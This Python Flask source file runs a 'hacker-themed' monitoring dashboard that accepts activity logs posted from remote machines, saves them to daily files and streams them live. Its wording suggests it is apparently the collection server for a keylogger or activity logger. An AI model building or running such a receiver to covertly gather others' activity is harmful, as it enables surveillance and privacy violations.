from flask import Flask, Response, render_template_string, request, jsonify
from datetime import datetime
import os
import queue
import time

app = Flask(__name__)

# Queue to store logs for real-time streaming
log_queue = queue.Queue()

if not os.path.exists('logs'):
    os.makedirs('logs')

# Hacker-themed HTML template
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ACTIVITY MONITOR // SYSTEM LOGS</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            overflow: hidden;
            background-image: 
                repeating-linear-gradient(0deg, rgba(0,255,0,0.03) 0px, transparent 1px, transparent 2px, rgba(0,255,0,0.03) 3px),
                repeating-linear-gradient(90deg, rgba(0,255,0,0.03) 0px, transparent 1px, transparent 2px, rgba(0,255,0,0.03) 3px);
        }

        .container {
            height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 20px;
        }

        .header {
            border: 2px solid #0f0;
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 0 0 20px rgba(0,255,0,0.3);
            animation: glow 2s ease-in-out infinite alternate;
        }

        @keyframes glow {
            from { box-shadow: 0 0 10px rgba(0,255,0,0.3); }
            to { box-shadow: 0 0 30px rgba(0,255,0,0.6); }
        }

        .header h1 {
            font-size: 28px;
            text-shadow: 0 0 10px #0f0;
            margin-bottom: 10px;
            letter-spacing: 3px;
        }

        .header .status {
            display: flex;
            justify-content: space-between;
            font-size: 14px;
            margin-top: 10px;
        }

        .status-item {
            display: flex;
            align-items: center;
        }

        .status-indicator {
            width: 10px;
            height: 10px;
            background: #0f0;
            border-radius: 50%;
            margin-right: 8px;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0%, 50% { opacity: 1; }
            51%, 100% { opacity: 0.3; }
        }

        .log-container {
            flex: 1;
            border: 2px solid #0f0;
            padding: 20px;
            overflow-y: auto;
            background: rgba(0,0,0,0.8);
            box-shadow: inset 0 0 20px rgba(0,255,0,0.2);
        }

        .log-container::-webkit-scrollbar {
            width: 10px;
        }

        .log-container::-webkit-scrollbar-track {
            background: #000;
        }

        .log-container::-webkit-scrollbar-thumb {
            background: #0f0;
            box-shadow: 0 0 10px #0f0;
        }

        .log-entry {
            margin-bottom: 15px;
            padding: 10px;
            border-left: 3px solid #0f0;
            background: rgba(0,255,0,0.05);
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateX(-20px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        .log-timestamp {
            color: #0f0;
            font-weight: bold;
            text-shadow: 0 0 5px #0f0;
        }

        .log-machine {
            color: #00ff88;
            margin-top: 5px;
        }

        .log-data {
            margin-top: 10px;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border: 1px solid #0f0;
            white-space: pre-wrap;
            word-break: break-all;
        }

        .terminal-prompt::before {
            content: '> ';
            color: #00ff88;
        }

        .stats {
            display: flex;
            gap: 20px;
            margin-top: 5px;
        }

        .stat-box {
            padding: 5px 10px;
            border: 1px solid #0f0;
            background: rgba(0,255,0,0.1);
        }

        .no-logs {
            text-align: center;
            padding: 40px;
            opacity: 0.5;
            font-size: 18px;
        }

        .cursor {
            display: inline-block;
            width: 10px;
            height: 20px;
            background: #0f0;
            animation: blink 1s infinite;
            margin-left: 5px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>⚡ Hack Jeeva MONITORING SYSTEM ⚡</h1>
            <div class="status">
                <div class="status-item">
                    <div class="status-indicator"></div>
                    <span>SYSTEM ACTIVE</span>
                </div>
                <div class="status-item">
                    <span id="time"></span>
                </div>
            </div>
            <div class="stats">
                <div class="stat-box">LOGS: <span id="log-count">0</span></div>
                <div class="stat-box">STATUS: <span style="color: #0f0;">ONLINE</span></div>
            </div>
        </div>

        <div class="log-container" id="logs">
            <div class="no-logs">
                <span class="terminal-prompt">WAITING FOR INCOMING DATA</span>
                <span class="cursor"></span>
            </div>
        </div>
    </div>

    <script>
        const logsContainer = document.getElementById('logs');
        const logCountEl = document.getElementById('log-count');
        let logCount = 0;

        // Update time
        function updateTime() {
            const now = new Date();
            document.getElementById('time').textContent = now.toLocaleTimeString();
        }
        setInterval(updateTime, 1000);
        updateTime();

        // Server-Sent Events for real-time logs
        const eventSource = new EventSource('/stream');

        eventSource.onmessage = function(event) {
            const data = JSON.parse(event.data);
            
            // Remove "no logs" message
            if (logCount === 0) {
                logsContainer.innerHTML = '';
            }
            
            logCount++;
            logCountEl.textContent = logCount;

            // Create log entry
            const logEntry = document.createElement('div');
            logEntry.className = 'log-entry';
            logEntry.innerHTML = `
                <div class="log-timestamp terminal-prompt">[${data.timestamp}] TRANSMISSION RECEIVED</div>
                <div class="log-machine terminal-prompt">SOURCE: ${data.machine_id}</div>
                <div class="log-data">${escapeHtml(data.log_data)}</div>
            `;

            logsContainer.insertBefore(logEntry, logsContainer.firstChild);

            // Keep only last 50 logs
            while (logsContainer.children.length > 50) {
                logsContainer.removeChild(logsContainer.lastChild);
            }
        };

        eventSource.onerror = function() {
            console.error('SSE connection error');
        };

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def index():
    """Serve the hacker-themed dashboard"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/stream')
def stream():
    """Server-Sent Events endpoint for real-time log streaming"""
    def event_stream():
        while True:
            try:
                # Wait for new log data (with timeout)
                log_data = log_queue.get(timeout=30)
                yield f"data: {log_data}\n\n"
            except queue.Empty:
                # Send keep-alive ping
                yield f": ping\n\n"
    
    return Response(event_stream(), mimetype='text/event-stream')

@app.route('/api/logs', methods=['POST'])
def receive_logs():
    """API endpoint to receive logs from activity logger"""
    try:
        data = request.json
        
        # Print to console
        print(f"\n{'='*50}")
        print(f"[{datetime.now()}] ✓ RECEIVED LOGS")
        print(f"Machine: {data.get('machine_id')}")
        print(f"Log data:\n{data.get('log_data')}")
        print(f"{'='*50}\n")
        
        # Save to file
        log_file = f"logs/activity_logs_{datetime.now().strftime('%Y%m%d')}.txt"
        with open(log_file, "a", encoding='utf-8') as f:
            f.write(f"\n--- {data.get('timestamp')} ---\n")
            f.write(data.get('log_data', ''))
            f.write(f"\n")
        
        # Add to queue for real-time streaming
        import json
        log_queue.put(json.dumps(data))
        
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error: {e}")
        return jsonify({"error": str(e)}), 500

if __name__ == '__main__':
    print("="*60)
    print("🔥 HACKER MONITORING SYSTEM INITIALIZED 🔥")
    print("="*60)
    print("Server: http://localhost:8000")
    print("Dashboard: http://localhost:8000/")
    print("="*60)
    app.run(host='127.0.0.1', port=8000, debug=True, threaded=True)


